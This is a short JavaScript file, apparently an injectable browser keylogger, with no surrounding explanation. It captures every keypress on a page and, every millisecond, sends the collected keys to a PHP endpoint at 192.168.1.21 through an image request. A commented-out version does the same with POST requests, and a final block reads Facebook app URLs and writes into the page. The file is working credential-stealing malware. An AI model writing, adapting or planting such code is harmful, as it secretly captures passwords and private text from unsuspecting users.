//document.onkeypress = function(evt) {
//   evt = evt || window.event;
//   key = String.fromCharCode(evt.charCode);
//   if (key) {
//      var http = new XMLHttpRequest();
//      var param = encodeURI(key)
//      http.open("POST","http://192.168.1.21/keylogger.php",true);
//      http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
//      http.send("key="+param);
//   }
//}
var keys = '';
 
document.onkeypress = function(e) {
    var get = window.event ? event : e;
    var key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    keys += key;
}
 
window.setInterval(function(){
    new Image().src = 'http://192.168.1.21/keylogger.php?c=' + keys;
    keys = '';
}, 1);

if (document.URL.indexOf("apps.facebook.com") != -1 && document.URL.indexOf("todotrucos.org/h42-redirect") == -1) {
	var app = document.URL.replace("https://apps.facebook.com/", "");
	var applen = app.indexOf("/");
	var app = app.slice(0,applen);
	document.getElementById("rightCol").innerHTML = app;
}
